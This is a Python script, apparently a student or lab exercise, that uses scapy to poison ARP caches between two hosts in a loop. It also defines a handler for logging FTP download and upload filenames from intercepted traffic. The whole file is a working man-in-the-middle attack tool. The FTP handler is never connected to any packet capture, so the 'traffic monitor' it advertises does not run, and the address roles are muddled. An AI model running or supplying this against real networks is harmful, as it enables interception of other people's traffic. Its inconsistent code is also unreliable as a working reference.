#!/usr/local/bin/python3
import argparse
import scapy.all as scapy
import re
import time
import signal
import sys

def error_exit(msg):
    print(f"Error: {msg}", file=sys.stderr)
    sys.exit(1)

def spoof(ip_target, mac_target, ip_src):
    packet = scapy.ARP(pdst=ip_target, hwdst=mac_target, psrc=ip_src, op='is-at')
    scapy.send(packet, verbose=0, count=7)
    print(f" --- ARP Table spoofed at {ip_target} --- ")

def restore(ip_target, mac_target, ip_src, mac_src):
    packet = scapy.ARP(pdst=ip_target, hwdst=mac_target, psrc=ip_src, hwsrc=mac_src, op='is-at')
    scapy.send(packet, verbose=0, count=7)
    print(f" --- ARP Table restored at {ip_target} --- ")

def packet_callback(packet):
    if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
        payload = packet[scapy.Raw].load
        try:
            payload_str = payload.decode('utf-8', errors='ignore')
            if "RETR" in payload_str:
                filename = payload_str.split('RETR ')[1].split('\r\n')[0]
                print(f"Downloading: {filename}")
            elif "STOR" in payload_str:
                filename = payload_str.split('STOR ')[1].split('\r\n')[0]
                print(f"Uploading: {filename}")
        except Exception as e:
            print(f"Error parsing payload: {e}")

def exit_gracefully(signum, frame):
    global ip_src, mac_src, ip_target, mac_target
    print("\nRestoring ARP tables...")
    restore(ip_target, mac_target, ip_src, mac_src)
    restore(ip_src, mac_src, ip_target, mac_target)
    sys.exit(0)

def is_valid_ip(ip_str):
    try:
        parts = ip_str.split('.')
        if len(parts) != 4:
            return False
        for part in parts:
            num = int(part)
            if num < 0 or num > 255:
                return False
        return True
    except (ValueError, AttributeError):
        return False

def is_valid_mac(mac_str):
    mac_pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
    return bool(mac_pattern.match(mac_str))

def validate_args(args):
    if not is_valid_ip(args.ip_src):
        error_exit("Invalid source IP address")
    if not is_valid_mac(args.mac_src):
        error_exit("Invalid source MAC address")
    if not is_valid_ip(args.ip_target):
        error_exit("Invalid target IP address")
    if not is_valid_mac(args.mac_target):
        error_exit("Invalid target MAC address")

def parse_args():
    parser = argparse.ArgumentParser(description="ARP spoofing and FTP traffic monitor")
    parser.add_argument("ip_src", type=str, help="Source IP address (your machine)")
    parser.add_argument("mac_src", type=str, help="Source MAC address (your machine)")
    parser.add_argument("ip_target", type=str, help="Target IP address to spoof")
    parser.add_argument("mac_target", type=str, help="Target MAC address to spoof")
    parser.add_argument("-i", "--interface", type=str, default="eth0", 
                       help="Network interface to use (default: eth0)")
    return parser.parse_args()

def main():
    global ip_src, mac_src, ip_target, mac_target
    
    try:
        args = parse_args()
        validate_args(args)
        
        # Store values globally for signal handler
        ip_src = args.ip_src
        mac_src = args.mac_src
        ip_target = args.ip_target
        mac_target = args.mac_target
        
        # Set up signal handler for graceful exit
        signal.signal(signal.SIGINT, exit_gracefully)
        signal.signal(signal.SIGTERM, exit_gracefully)
        
        print(f"Starting ARP spoofing on interface {args.interface}")
        print(f"Source: {ip_src} ({mac_src})")
        print(f"Target: {ip_target} ({mac_target})")
        print("Press Ctrl+C to stop and restore ARP tables\n")
        
        # Continuous ARP poisoning
        while True:
            try:
                spoof(ip_target, mac_target, ip_src)
                spoof(ip_src, mac_src, ip_target)
                time.sleep(2)
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"Error during spoofing: {e}")
                time.sleep(5)
                
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit(0)
    except Exception as e:
        error_exit(str(e))

if __name__ == '__main__':
    main()